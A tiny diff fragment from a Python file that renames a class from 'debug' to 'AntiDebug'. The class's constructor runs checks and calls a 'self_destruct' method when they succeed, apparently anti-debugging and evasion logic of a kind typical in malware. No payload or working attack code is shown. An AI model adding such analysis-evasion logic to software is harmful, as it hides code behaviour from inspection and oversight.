@@ -8,7 +8,7 @@ import psutil
 import requests
 
 
-class debug:
+class AntiDebug:
     def __init__(self) -> None:
         if self.checks():
             self.self_destruct()
